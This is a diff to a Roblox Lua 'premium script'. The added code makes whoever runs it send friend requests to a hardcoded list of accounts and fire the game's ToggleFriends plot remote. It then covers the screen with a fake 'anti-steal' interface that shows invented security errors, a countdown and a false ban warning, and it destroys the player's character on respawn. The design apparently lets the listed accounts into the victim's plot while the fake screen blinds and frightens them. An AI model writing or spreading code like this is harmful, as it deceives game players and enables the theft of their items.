@@ -1,26 +1,84 @@
---[[
-   _____ _____ _____ _____ _____ _______ _____ _____ __ __
-  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
- | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
-  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
- |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
-                                                                    
-                        Scripts.SM | Premium Scripts
-                        Made by: Scripter.SM
-                        Discord: discord.gg/cnUAk7uc3n
-]]
------------------------------------------------------------------
--- ANTI-STEAL FAKE GUI - RANDOM ERROR PROTECTION
------------------------------------------------------------------
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+-- Roblox: Friend Request + ToggleFriends + Anti-Steal GUI (ONLY ON TARGET JOIN)
+-- WARNING: High risk of detection. Use alt accounts only.
 
--- Safe executor detection fallback
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- ==================== CONFIG ====================
+local tester_users = {
+    "SMILEY_RIVALS",
+    "ta3123321",
+    "BUZZFTWGOD",
+    "Smiley9Gamerz",
+    "SABBY_LEAF"
+}
+
+local users = {}
+
+spawn(function()
+    repeat task.wait() until _G["Script-SM_Config"]
+    users = _G["Script-SM_Config"].users or {}
+end)
+-- ===============================================
+
+local processed = {}
+local guiCreated = false  -- Prevents multiple GUIs
+
+-- Get all target names (deduped)
+local function getAllTargets()
+    local targets = {}
+    local seen = {}
+    local function add(name)
+        if name and type(name) == "string" and not seen[name] then
+            seen[name] = true
+            table.insert(targets, name)
+        end
+    end
+    for _, v in ipairs(tester_users) do add(v) end
+    for _, v in ipairs(users) do add(v) end
+    return targets
+end
+
+-- Fire ToggleFriends EXACTLY
+local function fireToggleFriends()
+    pcall(function()
+        ReplicatedStorage.Packages.Net:WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
+    end)
+end
+
+-- Process player: Friend request + GUI + Toggle
+local function processPlayer(player)
+    if processed[player.Name] or guiCreated then return end
+    processed[player.Name] = true
+
+    print("[TARGET] Found: " .. player.Name)
+
+    -- 1. Send Friend Request
+    if not LocalPlayer:IsFriendsWith(player.UserId) then
+        pcall(function()
+            LocalPlayer:RequestFriendship(player)
+            print("[FriendReq] Sent to " .. player.Name)
+        end)
+    else
+        print("[FriendReq] Already friends with " .. player.Name)
+    end
+
+    -- 2. Fire ToggleFriends
+    fireToggleFriends()
+
+    -- 3. CREATE GUI ONLY ONCE
+    if not guiCreated then
+        guiCreated = true
+        spawn(CreateAntiStealGUI)  -- GUI runs here
+    end
+end
+
+-- ==================== ANTI-STEAL GUI (EXACT COPY) ====================
 local function detectExecutor()
     if identifyexecutor then
-        local name, version = identifyexecutor()
-        return name .. (version and " v" .. version or "")
+        local n, v = identifyexecutor()
+        return n .. (v and " v" .. v or "")
     elseif getexecutorname then
         return getexecutorname()
     else
@@ -28,16 +86,15 @@ local function detectExecutor()
     end
 end
 
-local function CreateGui()
+function CreateAntiStealGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "ExecutorAntiStealLoop"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
     gui.DisplayOrder = 999999
-    gui.Parent = player:WaitForChild("PlayerGui")
+    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
-    -- Background
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
     bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
@@ -52,7 +109,6 @@ local function CreateGui()
     bgGrad.Rotation = 90
     bgGrad.Parent = bg
 
-    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.92, 0, 0.13, 0)
     title.Position = UDim2.new(0.5, 0, 0.43, 0)
@@ -65,7 +121,6 @@ local function CreateGui()
     title.TextStrokeTransparency = 0.7
     title.Parent = bg
 
-    -- Subtitle
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
     subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
@@ -79,7 +134,6 @@ local function CreateGui()
     subtitle.TextXAlignment = Enum.TextXAlignment.Center
     subtitle.Parent = bg
 
-    -- Warning
     local warning = Instance.new("TextLabel")
     warning.Size = UDim2.new(0.78, 0, 0.12, 0)
     warning.Position = UDim2.new(0.5, 0, 0.64, 0)
@@ -93,7 +147,6 @@ local function CreateGui()
     warning.TextXAlignment = Enum.TextXAlignment.Center
     warning.Parent = bg
 
-    -- Countdown
     local countdown = Instance.new("TextLabel")
     countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
     countdown.Position = UDim2.new(0.5, 0, 0.74, 0)
@@ -105,7 +158,6 @@ local function CreateGui()
     countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
     countdown.Parent = bg
 
-    -- Console Panel
     local console = Instance.new("Frame")
     console.Size = UDim2.new(0.88, 0, 0.25, 0)
     console.Position = UDim2.new(0.5, 0, 0.82, 0)
@@ -146,7 +198,6 @@ local function CreateGui()
     logArea.TextWrapped = true
     logArea.Parent = console
 
-    -- Failure Message
     local failureMsg = Instance.new("TextLabel")
     failureMsg.Size = UDim2.new(0.9, 0, 0.25, 0)
     failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
@@ -162,7 +213,6 @@ local function CreateGui()
     failureMsg.Visible = false
     failureMsg.Parent = bg
 
-    -- Watermark
     local watermark = Instance.new("TextLabel")
     watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
     watermark.Position = UDim2.new(1, -12, 1, -12)
@@ -175,7 +225,6 @@ local function CreateGui()
     watermark.TextXAlignment = Enum.TextXAlignment.Right
     watermark.Parent = bg
 
-    -- Console Logs
     local logLines = {}
     local function addLog(text, color)
         table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
@@ -187,7 +236,6 @@ local function CreateGui()
         logArea.Text = display
     end
 
-    -- Fake error actions
     local errorActions = {
         "Scanning for injected bytecode...",
         "Blocking unauthorized remote calls",
@@ -209,31 +257,24 @@ local function CreateGui()
         "ALERT: Unauthorized GUI injection"
     }
 
-    -- Infinite loop
     task.spawn(function()
-        while player.Parent and gui.Parent do
+        while LocalPlayer.Parent and gui.Parent do
             local totalSeconds = 300
             local startTime = tick()
             failureMsg.Visible = false
-
             while tick() - startTime < totalSeconds do
                 if not gui.Parent then break end
                 local remaining = totalSeconds - math.floor(tick() - startTime)
                 local mins = math.floor(remaining / 60)
                 local secs = remaining % 60
                 countdown.Text = string.format("Fixing in %d:%02d...", mins, secs)
-
                 task.wait(math.random(15, 35) / 10)
-
-                -- Random normal log
                 if math.random() < 0.7 then
                     addLog(errorActions[math.random(#errorActions)])
                 else
                     addLog(criticalErrors[math.random(#criticalErrors)], Color3.fromRGB(255, 100, 100))
                 end
             end
-
-            -- === FAILURE AFTER 5 MINUTES ===
             failureMsg.Text = "FIX FAILED:\nExploit could not be removed\nProgress reset & 6-month ban issued"
             failureMsg.Visible = true
             addLog("SYSTEM: Fix failed. Account flagged.", Color3.fromRGB(255, 50, 50))
@@ -242,14 +283,52 @@ local function CreateGui()
         end
     end)
 
-    -- Optional: Prevent leaving
-    player.CharacterRemoving:Connect(function()
+    LocalPlayer.CharacterRemoving:Connect(function()
         task.wait(0.1)
-        if player.Character then
-            player.Character:Destroy()
+        if LocalPlayer.Character then
+            LocalPlayer.Character:Destroy()
         end
     end)
 end
 
--- Run
-CreateGui()
+-- ==================== MAIN MONITORING ====================
+local function startMonitoring()
+    print("[AutoFriend] Waiting for target players...")
+
+    local connection
+    connection = Players.PlayerAdded:Connect(function(player)
+        task.wait(1)
+        local targets = getAllTargets()
+        for _, name in ipairs(targets) do
+            if player.Name == name then
+                processPlayer(player)
+            end
+        end
+    end)
+
+    -- Initial scan
+    spawn(function()
+        task.wait(2)
+        local targets = getAllTargets()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                for _, name in ipairs(targets) do
+                    if player.Name == name then
+                        processPlayer(player)
+                    end
+                end
+            end
+        end
+    end)
+
+    -- Refresh _G config
+    while task.wait(5) do
+        spawn(function()
+            repeat task.wait() until _G["Script-SM_Config"]
+            users = _G["Script-SM_Config"].users or {}
+        end)
+    end
+end
+
+-- START
+startMonitoring()
